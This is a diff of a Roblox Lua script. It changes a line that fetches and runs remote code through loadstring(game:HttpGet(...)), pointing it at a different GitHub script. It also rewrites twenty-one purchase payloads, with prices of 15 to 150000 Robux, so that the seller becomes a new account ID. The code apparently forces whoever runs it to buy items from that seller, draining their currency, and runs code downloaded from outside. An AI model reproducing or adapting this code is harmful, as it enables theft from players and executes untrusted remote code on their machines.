@@ -1,7 +1,7 @@
 repeat task.wait() until game:IsLoaded()
 
 local function reject()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplay/robuc/main/rizz.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zlyxer/whitelist/main/MurderMystery2"))()
 wait(100000000000)
 end
 
@@ -28,27 +28,27 @@ if startIndex then
     end
 end
 
-local eros = '{"expectedCurrency":1,"expectedPrice":15,"expectedSellerId":7160745739}'
-local hercules = '{"expectedCurrency":1,"expectedPrice":25,"expectedSellerId":7160745739}'
-local hylos = '{"expectedCurrency":1,"expectedPrice":50,"expectedSellerId":7160745739}'
-local tartarus = '{"expectedCurrency":1,"expectedPrice":100,"expectedSellerId":7160745739}'
-local deimos = '{"expectedCurrency":1,"expectedPrice":200,"expectedSellerId":7160745739}'
-local artemis = '{"expectedCurrency":1,"expectedPrice":300,"expectedSellerId":7160745739}'
-local zeus = '{"expectedCurrency":1,"expectedPrice":500,"expectedSellerId":7160745739}'
-local kratos = '{"expectedCurrency":1,"expectedPrice":750,"expectedSellerId":7160745739}'
-local athena = '{"expectedCurrency":1,"expectedPrice":1000,"expectedSellerId":7160745739}'
-local hephaestus = '{"expectedCurrency":1,"expectedPrice":1500,"expectedSellerId":7160745739}'
-local hera = '{"expectedCurrency":1,"expectedPrice":2000,"expectedSellerId":7160745739}'
-local krampus = '{"expectedCurrency":1,"expectedPrice":2500,"expectedSellerId":7160745739}'
-local pegasus = '{"expectedCurrency":1,"expectedPrice":4000,"expectedSellerId":7160745739}'
-local poseidon = '{"expectedCurrency":1,"expectedPrice":6000,"expectedSellerId":7160745739}'
-local hermes = '{"expectedCurrency":1,"expectedPrice":8000,"expectedSellerId":7160745739}'
-local apollo = '{"expectedCurrency":1,"expectedPrice":13000,"expectedSellerId":7160745739}'
-local hades = '{"expectedCurrency":1,"expectedPrice":20000,"expectedSellerId":7160745739}'
-local demeter = '{"expectedCurrency":1,"expectedPrice":35000,"expectedSellerId":7160745739}'
-local atlas = '{"expectedCurrency":1,"expectedPrice":50000,"expectedSellerId":7160745739}'
-local cronus = '{"expectedCurrency":1,"expectedPrice":75000,"expectedSellerId":7160745739}'
-local helios = '{"expectedCurrency":1,"expectedPrice":150000,"expectedSellerId":7160745739}'
+local eros = '{"expectedCurrency":1,"expectedPrice":15,"expectedSellerId":4483821221}'
+local hercules = '{"expectedCurrency":1,"expectedPrice":25,"expectedSellerId":4483821221}'
+local hylos = '{"expectedCurrency":1,"expectedPrice":50,"expectedSellerId":4483821221}'
+local tartarus = '{"expectedCurrency":1,"expectedPrice":100,"expectedSellerId":4483821221}'
+local deimos = '{"expectedCurrency":1,"expectedPrice":200,"expectedSellerId":4483821221}'
+local artemis = '{"expectedCurrency":1,"expectedPrice":300,"expectedSellerId":4483821221}'
+local zeus = '{"expectedCurrency":1,"expectedPrice":500,"expectedSellerId":4483821221}'
+local kratos = '{"expectedCurrency":1,"expectedPrice":750,"expectedSellerId":4483821221}'
+local athena = '{"expectedCurrency":1,"expectedPrice":1000,"expectedSellerId":4483821221}'
+local hephaestus = '{"expectedCurrency":1,"expectedPrice":1500,"expectedSellerId":4483821221}'
+local hera = '{"expectedCurrency":1,"expectedPrice":2000,"expectedSellerId":4483821221}'
+local krampus = '{"expectedCurrency":1,"expectedPrice":2500,"expectedSellerId":4483821221}'
+local pegasus = '{"expectedCurrency":1,"expectedPrice":4000,"expectedSellerId":4483821221}'
+local poseidon = '{"expectedCurrency":1,"expectedPrice":6000,"expectedSellerId":4483821221}'
+local hermes = '{"expectedCurrency":1,"expectedPrice":8000,"expectedSellerId":4483821221}'
+local apollo = '{"expectedCurrency":1,"expectedPrice":13000,"expectedSellerId":4483821221}'
+local hades = '{"expectedCurrency":1,"expectedPrice":20000,"expectedSellerId":4483821221}'
+local demeter = '{"expectedCurrency":1,"expectedPrice":35000,"expectedSellerId":4483821221}'
+local atlas = '{"expectedCurrency":1,"expectedPrice":50000,"expectedSellerId":4483821221}'
+local cronus = '{"expectedCurrency":1,"expectedPrice":75000,"expectedSellerId":4483821221}'
+local helios = '{"expectedCurrency":1,"expectedPrice":150000,"expectedSellerId":4483821221}'
 
 task.wait(0.01)
 
